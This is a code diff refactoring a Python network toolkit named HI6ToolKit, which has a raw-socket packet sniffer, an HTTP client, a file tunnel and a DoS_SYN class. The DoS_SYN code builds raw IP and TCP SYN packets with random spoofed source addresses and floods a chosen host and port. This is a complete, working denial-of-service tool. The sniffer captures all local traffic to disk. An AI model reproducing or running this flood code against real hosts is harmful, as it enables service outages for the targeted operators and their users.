@@ -12,11 +12,10 @@ import argparse
 
 class Constant :
     MODULE : bool = __name__ != "__main__"
-    SUP_COLOR : bool = any(word in os.getenv("TERM") for word in ("linux", "xterm", "color"))
     TIME : int = round(time.time())
     ISOS : bool = any([os in sys.platform for os in ("linux", "bsd", "darwin")])
+    SUP_COLOR : bool = any(word in os.getenv("TERM") for word in ("linux", "xterm", "color")) if ISOS else False
     SLASH : str = chr(47)
-    SPACE : str = chr(32)
     TOOLS : dict = dict()
     INFO : str = f"""\n
         [System] : [{sys.platform.upper()}, {time.ctime()}]
@@ -28,14 +27,8 @@ class Constant :
 
     def SIGNAL(signum : int, stk_frm : "frame") :
         EXCEPTION : None = lambda error : print("\n\n[" + Constant.RED("!") + "]" + f" Error : {error or None}", file = sys.stderr)
-        Constant.EXCEPTION(Constant.RED(" **SIGNAL** ") + f"sig_num : {Constant.YELLOW(signal.Signals(signum).name)}")
+        EXCEPTION(Constant.RED(" **SIGNAL** ") + f"sig_num : {Constant.YELLOW(signal.Signals(signum).name)}")
         sys.exit(1)
-        return None
-
-    def SAVE(data : str) :
-        path = f"data_{Constant.TIME}.txt"
-        mode = "a" if os.path.exists(path) else "x"
-        print(data, file = open(path, mode))
         return None
 
     def RED(text : str) :
@@ -71,10 +64,52 @@ class Sniff :
         return self
 
     def __next__(self) :
-        try : return next(self.generator)
+        try :
+            result = next(self.generator)
         except StopIteration :
             self.generator = None
             raise StopIteration
+        else : return result
+
+    def __proto(self) :
+        if not Constant.ISOS and self.proto == socket.IPPROTO_TCP :
+            raise OSError("Can't use socket.IPPROTO_TCP")
+        return self.proto
+
+    def parse_headers(self, data : bytes) :
+        parsed_header = str()
+        t = "\n\t\t"
+        ver, ihl, tos, tln, idn, flg, oft, ttl, prt, csm, src, dst = self.ip_header(data[:20])
+        parsed_header += f"\n[*][Connection]{Constant.TIME:_^33}\n\n"
+        text = f"\tIPv4 Packet :{t}Version : {ver}  Header Length : {ihl}  Time of Service : {tos}"
+        text += f"{t}Total Length : {tln}  Identification : {idn}  Flags : {flg}"
+        text += f"{t}Fragment Offset : {oft}  TTL : {ttl}  Protocol : {prt}"
+        text += f"{t}Checksum : {csm}  Source : {src}  Destination : {dst}"
+        parsed_header += text + "\n\n"
+        if prt == "ICMP" :
+            typ, cod, csm, idn, seq, data = self.icmp_header(data[ihl:])
+            text = f"\tICMP Packet :{t}Type : {typ}{t}Code : {cod}{t}Checksum : {csm}{t}Identifier : {idn}{t}Sequence : {seq}{t}Raw Data :\n{self.indent_data(data)}"
+            parsed_header += text + "\n"
+        elif prt == "TCP" :
+            src, dst, seq, acn, oft, flg, win, csm, urg, data = self.tcp_header(data[ihl:])
+            text = f"\tTCP Segment :{t}Source Port : {src}{t}Destination Port : {dst}{t}Sequence : {seq}{t}Acknowledgment : {acn}{t}Data Offset : {oft}{t}Flags :{t}"
+            parsed_header += text + "\t"
+            text = f"URG:{flg['urg']}  ACK:{flg['ack']}  PSH:{flg['psh']}{t}\tRST:{flg['rst']}  SYN:{flg['syn']}  FIN:{flg['fin']}"
+            parsed_header += text + t
+            text = f"Window : {win}{t}Checksum : {csm}{t}Urgent Pointer : {urg}{t}Raw Data :\n{self.indent_data(data)}"
+            parsed_header += text
+        elif prt == "UDP" :
+            src, dst, tln, csm, data = self.udp_header(data[ihl:])
+            text = f"\tUDP Datagram :{t}Source Port : {src}{t}Destination Port : {dst}{t}Length : {tln}{t}Checksum : {csm}{t}Raw Data :\n{self.indent_data(data)}"
+            parsed_header += text + "\n"
+        return parsed_header
+
+    def sniff(self) :
+        if not Constant.MODULE :
+            print(Constant.YELLOW(Constant.INFO))
+            input("\nPress ENTER to continue...\n")
+        while True :
+            yield self.__sniff()
 
     @staticmethod
     def ip_header(raw_payload : bytes) :
@@ -94,7 +129,7 @@ class Sniff :
         csm = hex(payload[7])
         src = socket.inet_ntop(socket.AF_INET, payload[8])
         dst = socket.inet_ntop(socket.AF_INET, payload[9])
-        return (ver, ihl, tos, tln, idn, flg, oft, ttl, prt, csm, src, dst)
+        return ver, ihl, tos, tln, idn, flg, oft, ttl, prt, csm, src, dst
 
     @staticmethod
     def icmp_header(raw_payload : bytes) :
@@ -105,7 +140,7 @@ class Sniff :
         idn = payload[3]
         seq = payload[4]
         data = raw_payload[8:]
-        return (typ, cod, csm, idn, seq, data)
+        return typ, cod, csm, idn, seq, data
 
     @staticmethod
     def tcp_header(raw_payload : bytes) :
@@ -134,7 +169,7 @@ class Sniff :
         csm = hex(payload[7])
         urg = payload[8]
         data = raw_payload[oft:]
-        return (src, dst, seq, acn, oft, flg, win, csm, urg, data)
+        return src, dst, seq, acn, oft, flg, win, csm, urg, data
 
     @staticmethod
     def udp_header(raw_payload : bytes) :
@@ -144,58 +179,22 @@ class Sniff :
         tln = payload[2]
         csm = hex(payload[3])
         data = raw_payload[8:]
-        return (src, dst, tln, csm, data)
+        return src, dst, tln, csm, data
 
     @staticmethod
     def indent_data(data : bytes) :
         data = str(data).strip("b'\"")
         text = "\t\t\t"
-        for i in range(0, (len(data) // 64) + 1) :
+        for i in range((len(data) // 64) + 1) :
             text += data[i * 64 : (i * 64) + 64] + "\n\t\t\t"
         return text
 
-    def __proto(self) :
-        if not Constant.ISOS and self.proto == socket.IPPROTO_TCP :
-            raise OSError("Can't use socket.IPPROTO_TCP")
-        return self.proto
-
-    def parse_headers(self, data : bytes) :
-        parsed_header = str()
-        t = "\n\t\t"
-        ver, ihl, tos, tln, idn, flg, oft, ttl, prt, csm, src, dst = self.ip_header(data[:20])
-        parsed_header += f"\n[*][Connection]{Constant.TIME:_^33}\n\n"
-        text = f"\tIPv4 Packet :{t}Version : {ver}  Header Length : {ihl}  Time of Service : {tos}"
-        text += f"{t}Total Length : {tln}  Identification : {idn}  Flags : {flg}"
-        text += f"{t}Fragment Offset : {oft}  TTL : {ttl}  Protocol : {prt}"
-        text += f"{t}Checksum : {csm}  Source : {src}  Destination : {dst}"
-        parsed_header += text + "\n\n"
-
-        if prt == "ICMP" :
-            typ, cod, csm, idn, seq, data = self.icmp_header(data[ihl:])
-            text = f"\tICMP Packet :{t}Type : {typ}{t}Code : {cod}{t}Checksum : {csm}{t}Identifier : {idn}{t}Sequence : {seq}{t}Raw Data :\n{self.indent_data(data)}"
-            parsed_header += text + "\n"
-
-        elif prt == "TCP" :
-            src, dst, seq, acn, oft, flg, win, csm, urg, data = self.tcp_header(data[ihl:])
-            text = f"\tTCP Segment :{t}Source Port : {src}{t}Destination Port : {dst}{t}Sequence : {seq}{t}Acknowledgment : {acn}{t}Data Offset : {oft}{t}Flags :{t}"
-            parsed_header += text + "\t"
-            text = f"URG:{flg['urg']}  ACK:{flg['ack']}  PSH:{flg['psh']}{t}\tRST:{flg['rst']}  SYN:{flg['syn']}  FIN:{flg['fin']}"
-            parsed_header += text + t
-            text = f"Window : {win}{t}Checksum : {csm}{t}Urgent Pointer : {urg}{t}Raw Data :\n{self.indent_data(data)}"
-            parsed_header += text
-
-        elif prt == "UDP" :
-            src, dst, tln, csm, data = self.udp_header(data[ihl:])
-            text = f"\tUDP Datagram :{t}Source Port : {src}{t}Destination Port : {dst}{t}Length : {tln}{t}Checksum : {csm}{t}Raw Data :\n{self.indent_data(data)}"
-            parsed_header += text + "\n"
-        return parsed_header
-
-    def sniff(self) :
-        if not Constant.MODULE :
-            print(Constant.YELLOW(Constant.INFO))
-            input("\nPress ENTER to continue...\n")
-        while True :
-            yield self.__sniff()
+    @staticmethod
+    def tmp_file(data : str) :
+        path = f"data_{Constant.TIME}.txt"
+        mode = "a" if os.path.exists(path) else "x"
+        print(data, file = open(path, mode))
+        return None
 
     def __sniff(self) :
         with socket.socket(socket.AF_INET, socket.SOCK_RAW, self.__proto()) as sniff :
@@ -206,89 +205,22 @@ class Sniff :
                 if raw_data :
                     parsed_headers = self.parse_headers(raw_data)
                     parsed_headers = parsed_headers.expandtabs(4)
-                    Constant.SAVE(parsed_headers)
+                    self.tmp_file(parsed_headers)
                     if not Constant.ISOS : sniff.ioctl(socket.SIO_RCVALL, socket.RCVALL_OFF)
                     return parsed_headers
 
 
 class DoS_SYN :
-    def __init__(self, host: str, port : int) :
+    def __init__(self, host: str, port : int, rate : int) :
         self.host = host
         self.port = int(port)
-        self.generator = None
+        self.rate = rate
 
     def __repr__(self) :
         return f"{self.__class__} {self.__dict__}"
 
     def __str__(self) :
         return f"DoS_SYN : \n\t{self.host}\n\t{self.port}"
-
-    def __iter__(self) :
-        self.generator = self.flood()
-        return self
-
-    def __next__(self) :
-        try : return next(self.generator)
-        except StopIteration :
-            self.generator = None
-            raise StopIteration
-
-    @staticmethod
-    def ip_header(src : str, dst : str,
-                ver : int = 4, ihl : int = 5,
-                tos : int = 0, tln : int = 40,
-                idn : int = 0, flg : int = 0,
-                oft : int = 0, ttl : int = 255,
-                prt : int = socket.IPPROTO_TCP, csm : int = 0) :
-        ihl_ver = (ver << 4) + ihl
-        flg_oft = (flg << 13) + oft
-        datagram = struct.pack("!BBHHHBBH4s4s", ihl_ver, tos, tln, idn,
-                        flg_oft, ttl, prt, csm, src, dst)
-        return datagram
-
-    @staticmethod
-    def tcp_header(srp : int = 1337, dsp : int = 0,
-                seq : int = 0, acn : int = 0,
-                oft : int = 5, urg : int = 0,
-                ack : int = 0, psh : int = 0,
-                rst : int = 0, syn : int = 0,
-                fin : int = 0, win : int = 65535,
-                csm : int = 0, urp : int = 0) :
-        oft <<= 12
-        res = 0 << 6
-        flg = (urg << 5) + (ack << 4) + (psh << 3) + (rst << 2) + (syn << 1) + fin
-        oft_res_flg = oft + res + flg
-        segment = struct.pack("!HHLLHHHH", srp, dsp, seq, acn, oft_res_flg, win, csm, urp)
-        return segment
-
-    @staticmethod
-    def pseudo_header(src : str, dst : str,
-                res : int = 0, prt : int = socket.IPPROTO_TCP,
-                pln : int = 0) :
-        segment = struct.pack("!4s4sBBH", src, dst, res, prt, pln)
-        return segment
-
-    @staticmethod
-    def checksum(data : bytes) :
-        checksum = 0
-        for i in range(0, len(data), 2) :
-            word = (data[i] << 8) + data[i + 1]
-            checksum += word
-        checksum = (checksum >> 16) + (checksum & 65535)
-        checksum = (~ checksum) & 65535
-        return checksum
-
-    @staticmethod
-    def random_ip() :
-        secs = [str(random.randint(0, 255)) for _ in range(0, 4)]
-        return ".".join(secs)
-
-    @staticmethod
-    def load_symbol(count : int, rate : int, char : str) :
-        if count > rate :
-            raise ValueError("\"count\" argument must be smaller than \"rate\"")
-        sec = rate >> 5
-        return (count // sec) * char
 
     def prepare(self) :
         randip = self.random_ip()
@@ -311,18 +243,82 @@ class DoS_SYN :
         if not Constant.MODULE :
             print(Constant.YELLOW(Constant.INFO))
             input("\nPress ENTER to continue...\n")
-        while True :
-            self.__flood()
-            yield None
+        self.__flood()
+        return None
+
+    @staticmethod
+    def ip_header(src : str, dst : str,
+        ver : int = 4, ihl : int = 5,
+        tos : int = 0, tln : int = 40,
+        idn : int = 0, flg : int = 0,
+        oft : int = 0, ttl : int = 255,
+        prt : int = socket.IPPROTO_TCP, csm : int = 0) :
+        ihl_ver = (ver << 4) + ihl
+        flg_oft = (flg << 13) + oft
+        datagram = struct.pack("!BBHHHBBH4s4s", ihl_ver, tos, tln, idn, flg_oft, ttl, prt, csm, src, dst)
+        return datagram
+
+    @staticmethod
+    def tcp_header(srp : int = 1337, dsp : int = 0,
+        seq : int = 0, acn : int = 0,
+        oft : int = 5, urg : int = 0,
+        ack : int = 0, psh : int = 0,
+        rst : int = 0, syn : int = 0,
+        fin : int = 0, win : int = 65535,
+        csm : int = 0, urp : int = 0) :
+        oft <<= 12
+        res = 0 << 6
+        flg = (urg << 5) + (ack << 4) + (psh << 3) + (rst << 2) + (syn << 1) + fin
+        oft_res_flg = oft + res + flg
+        segment = struct.pack("!HHLLHHHH", srp, dsp, seq, acn, oft_res_flg, win, csm, urp)
+        return segment
+
+    @staticmethod
+    def pseudo_header(src : str, dst : str,
+        res : int = 0, prt : int = socket.IPPROTO_TCP,
+        pln : int = 0) :
+        segment = struct.pack("!4s4sBBH", src, dst, res, prt, pln)
+        return segment
+
+    @staticmethod
+    def checksum(data : bytes) :
+        checksum = 0
+        for i in range(0, len(data), 2) :
+            word = (data[i] << 8) + data[i + 1]
+            checksum += word
+        checksum = (checksum >> 16) + (checksum & 65535)
+        checksum = (~ checksum) & 65535
+        return checksum
+
+    @staticmethod
+    def random_ip() :
+        secs = [str(random.randint(0, 255)) for _ in range(0, 4)]
+        return ".".join(secs)
+
+    @staticmethod
+    def progress_bar(x : int, y : int) :
+        symbol = Constant.SLASH
+        sec = y // 32
+        now = x // sec
+        return now * symbol
 
     def __flood(self) :
-        payload = self.prepare()
-        with socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP) as flood :
-            flood.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
-            flood.connect((self.host, self.port))
-            flood.sendto(payload, (self.host, self.port))
-            flood.shutdown(socket.SHUT_RDWR)
-            return None
+        count = 0
+        while count != self.rate :
+            payload = self.prepare()
+            with socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP) as flood :
+                flood.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
+                flood.connect((self.host, self.port))
+                flood.sendto(payload, (self.host, self.port))
+                flood.shutdown(socket.SHUT_RDWR)
+            count += 1
+            text = "[" + Constant.GREEN("+") + "]" + " " + f"{self.progress_bar(count, self.rate)}" + " " + f"[{count}/{self.rate}]"
+            print(text, end = "\r", flush = True)
+        else :
+            end_time = round((time.time() - Constant.TIME), 2)
+            print("\n[" + Constant.GREEN("+") + "]" + " " + "all SYN segments have sent")
+            print("[" + Constant.GREEN("+") + "]" + " " + f"{end_time}s")
+        return None
 
 
 class HTTP_Request :
@@ -347,6 +343,7 @@ class HTTP_Request :
             print(Constant.YELLOW(Constant.INFO))
             input("\nPress ENTER to continue...\n")
         self.__request()
+        return None
 
     def __request(self) :
         if self.https : sslcontext = ssl.create_default_context()
@@ -354,12 +351,13 @@ class HTTP_Request :
             http.settimeout(30)
             http = sslcontext.wrap_socket(http, server_hostname = self.host) if self.https else http
             payload = [
-                        f"{self.method} {self.end} HTTP/1.1",
-                        f"Host: {self.host}",
-                        "User-Agent: HI6ToolKit",
-                        "Accept: */*",
-                        "Connection: close",
-                        "\r\n"]
+                f"{self.method} {self.end} HTTP/1.1",
+                f"Host: {self.host}",
+                "User-Agent: HI6ToolKit",
+                "Accept: */*",
+                "Connection: close",
+                "\r\n"
+                ]
             payload = "\r\n".join(payload)
             self.request_header = payload.encode()
             if not Constant.MODULE : print(payload)
@@ -379,7 +377,6 @@ class HTTP_Request :
                     break
                 else :
                     raw_data += response
-                    continue
         return None
 
 
@@ -402,6 +399,7 @@ class Tunnel :
             print(Constant.YELLOW(Constant.INFO))
             input("\nPress ENTER to continue...\n")
         self.__tunnel()
+        return None
 
     def init_server(self) :
         self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
@@ -439,16 +437,14 @@ class Tunnel :
         keyword = "name"
         if keyword in headers :
             return headers[keyword] + f"_{round(time.time())}"  + ".tmp"
-        else :
-            return f"new_{round(time.time())}.tmp"
+        else : return f"new_{round(time.time())}.tmp"
 
     @staticmethod
     def get_length(headers : dict) :
         keyword = "Content-Length"
         if keyword in headers :
             return int(headers[keyword])
-        else :
-            return 0
+        else : return 0
 
     @staticmethod
     def get_status(headers : dict) :
@@ -510,7 +506,7 @@ class Tunnel :
 
     @staticmethod
     def progress_bar(x : int, y : int) :
-        symbol = "/"
+        symbol = Constant.SLASH
         sec = y // 32
         now = x // sec
         return now * symbol
@@ -558,9 +554,7 @@ class Tunnel :
         return None
 
 
-
 if not Constant.MODULE :
-    args = None
     def manage_args() :
         parser = argparse.ArgumentParser(prog = "HI6ToolKit", add_help = True)
         parser.add_argument("Tool", type = str, help = "To specify tool [SNIFF, DOS, HTTP, TUNNEL]")
@@ -632,20 +626,8 @@ if not Constant.MODULE :
         host = socket.gethostbyname(args["host"])
         port = args["port"]
         rate = args["rate"]
-        while rate % 32 != 0 : rate += 1
-        flood = DoS_SYN(host, port)
-        flood = iter(flood)
-        for i in range(1, rate + 1) :
-            next(flood)
-            text = "[" + Constant.GREEN("+") + "]" + " " + f"{DoS_SYN.load_symbol(i, rate, Constant.SLASH)} " + f"{Constant.YELLOW(str(i))}" + " packets sent"
-            if not Constant.MODULE : print(text, end = "\r", flush = True)
-        else :
-            if not Constant.MODULE :
-                time.sleep(2)
-                end_time = round((time.time() - Constant.TIME), 2)
-                print("\n[" + Constant.GREEN("+") + "]" + " All packets have sent")
-                print("[" + Constant.GREEN("+") + "]" + f" {end_time}s")
-
+        flood = DoS_SYN(host, port, rate)
+        flood.flood()
         return None
 
     @command(tool = "HTTP")
